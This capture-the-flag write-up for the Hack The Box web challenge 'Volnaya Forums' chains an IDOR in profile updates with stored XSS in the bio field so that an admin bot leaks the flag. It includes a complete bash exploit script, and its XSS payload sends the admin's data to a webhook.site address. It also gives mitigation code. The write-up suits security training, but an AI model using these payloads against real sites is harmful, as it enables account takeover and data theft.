# Volnaya Forums - CTF Write-Up

## Challenge Overview

**Challenge Name:** Volnaya Forums  
**Category:** Web  
**Difficulty:** easy  
**Flag:** `HTB{f1x4t3d_r3d1r3c73d_pwn3d_351d0f5a35b369bd77921126af53149c}`

This is a Next.js forum application with a bot that reviews reported posts. The application has several critical vulnerabilities that can be chained together to extract the admin flag.

## Initial Reconnaissance

### Application Structure
- **Frontend:** Next.js React application with TypeScript
- **Backend:** Next.js API routes with Better SQLite3 database
- **Authentication:** Iron Session for session management
- **Bot:** Puppeteer bot that visits reported URLs with admin credentials

### Key Endpoints
- `/api/register` - User registration
- `/api/login` - User authentication
- `/api/profile` - Profile management (GET/POST)
- `/api/auth` - Authentication status check (**Contains flag for admin users**)
- `/api/report` - Submit reports that trigger bot visits
- `/profile` - User profile page with bio rendering

## Vulnerability Analysis

### 1. Critical IDOR in Profile Update
**Location:** `pages/api/profile.ts:28-38`

```typescript
// The vulnerability
const { username, email, bio } = req.body as {
    username: string;
    email: string;
    bio: string;
};

try {
    db.prepare('UPDATE users SET email = ?, bio = ? WHERE username = ?').run(
        email,
        bio,
        username  // ❌ Uses username from request body, not session!
    );
```

**Issue:** The endpoint accepts `username` from the request body without validating it matches the authenticated user's session. This allows any authenticated user to update ANY user's profile.

### 2. Stored XSS in Bio Field
**Location:** `pages/profile.tsx:179`

```tsx
{profile.bio ? (
    <div
        className="prose"
        dangerouslySetInnerHTML={{ __html: profile.bio }}  // ❌ No sanitization
    />
) : (
    <p className="text-muted-foreground">Not specified</p>
)}
```

**Issue:** User bio content is rendered with `dangerouslySetInnerHTML` without any sanitization, allowing HTML/JavaScript injection.

### 3. Flag Exposure in Auth Endpoint
**Location:** `pages/api/auth.ts:36`

```typescript
return res.status(200).json({
    authenticated: true,
    user: {
        username: session.user.username,
        role: session.user.role,
        ...(session.user.username === 'admin' ? { flag } : {}),  // Flag exposed here
    },
});
```

**Issue:** The flag is directly exposed in the API response for admin users.

### 4. Bot SSRF Functionality
**Location:** `lib/bot.ts:29-76`

The bot automatically visits user-controlled URLs with admin privileges when reports are submitted.

## Exploitation Strategy

### Step 1: Register and Login

First, create an account on the target application:

```bash
# Register account
curl -X POST "http://target:port/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username": "hacker", "email": "hacker@example.com", "password": "password123"}' \
  -c cookies.txt
```

```bash
# Login to get session
curl -X POST "http://target:port/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "hacker", "password": "password123"}' \
  -b cookies.txt -c cookies.txt
```

### Step 2: Exploit IDOR to Update Admin Profile

Create a malicious payload that will extract the flag when executed:

```json
{
  "username": "admin",
  "email": "admin@volnaya-forums.htb", 
  "bio": "<img src=x onerror=\"fetch('/api/auth').then(r=>r.json()).then(d=>{if(d.user&&d.user.flag){var img=new Image();img.src='https://webhook.site/YOUR-WEBHOOK-ID?flag='+encodeURIComponent(d.user.flag);}})\\">"
}
```

**Important:** Replace `YOUR-WEBHOOK-ID` with your actual webhook.site ID.

Upload the payload to update the admin's profile:

```bash
curl -X POST "http://target:port/api/profile" \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d @payload.json
```

### Step 3: Trigger Bot to Execute XSS

Submit a report to make the bot visit the profile page:

```bash
curl -X POST "http://target:port/api/report" \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"postThread": "/profile", "reason": "Security review needed"}'
```

### Step 4: Collect the Flag

The bot will:
1. Visit the profile page with admin credentials
2. Load the page which renders the admin's bio (our XSS payload)
3. Execute the JavaScript which fetches `/api/auth`
4. Extract the flag from the API response
5. Send it to your webhook

Check your webhook logs to retrieve the flag!

## Complete Exploit Script

```bash
#!/bin/bash

TARGET="http://target:port"
WEBHOOK="https://webhook.site/YOUR-WEBHOOK-ID"

# Step 1: Register and login
echo "[+] Registering account..."
curl -X POST "$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username": "hacker", "email": "hacker@example.com", "password": "password123"}' \
  -c cookies.txt

echo "[+] Logging in..."
curl -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "hacker", "password": "password123"}' \
  -b cookies.txt -c cookies.txt

# Step 2: Create XSS payload
echo "[+] Creating XSS payload..."
cat > payload.json << EOF
{
  "username": "admin",
  "email": "admin@volnaya-forums.htb", 
  "bio": "<img src=x onerror=\"fetch('/api/auth').then(r=>r.json()).then(d=>{if(d.user&&d.user.flag){var img=new Image();img.src='$WEBHOOK?flag='+encodeURIComponent(d.user.flag);}})\\">"
}
EOF

# Step 3: Exploit IDOR to update admin profile
echo "[+] Updating admin profile via IDOR..."
curl -X POST "$TARGET/api/profile" \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d @payload.json

# Step 4: Trigger bot
echo "[+] Triggering bot to execute XSS..."
curl -X POST "$TARGET/api/report" \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"postThread": "/profile", "reason": "Security review needed"}'

echo "[+] Check your webhook for the flag!"
echo "[+] Webhook URL: $WEBHOOK"
```

## Attack Chain Summary

```
1. Register Account → 2. Exploit IDOR → 3. Inject XSS → 4. Trigger Bot → 5. Extract Flag
```

## Key Vulnerabilities Exploited

1. **IDOR (Insecure Direct Object Reference):** Profile update accepts any username
2. **Stored XSS:** Bio field renders HTML without sanitization  
3. **Information Disclosure:** Flag exposed in auth endpoint for admin users
4. **SSRF via Bot:** Bot visits user-controlled URLs with admin privileges

## Mitigation Recommendations

### For IDOR Vulnerability
```typescript
// Fix: Validate username matches session
const session = await getApiSession(req, res);
if (username !== session.user.username) {
    return res.status(403).json({ error: 'Cannot update other users' });
}
```

### For XSS Vulnerability
```typescript
// Fix: Sanitize HTML content
import DOMPurify from 'isomorphic-dompurify';

const sanitizedBio = DOMPurify.sanitize(profile.bio);
// Then render sanitized content
```

### For Information Disclosure
```typescript
// Fix: Don't expose sensitive data in API responses
// Move flag to a separate admin-only endpoint with proper authorization
```

### General Security Measures
1. **Input Validation:** Validate all user inputs on both client and server
2. **Authorization Checks:** Always verify user permissions for resource access
3. **Content Security Policy:** Implement CSP headers to prevent XSS
4. **Bot Sandboxing:** Run bot in isolated environment with limited privileges

## Additional Vulnerabilities Found

- **Logic Bug in Report System:** `COUNT(*)` returns wrong object structure
- **No Rate Limiting:** Report submission not rate limited
- **Session Security:** Hardcoded fallback session secret (though overridden in production)

This challenge demonstrates how multiple seemingly minor vulnerabilities can be chained together to achieve full application compromise. The key lesson is that proper authorization checks and input sanitization are critical for web application security.

## Write-Up Credit: [binchickens69](https://ctf.hackthebox.com/user/profile/605069)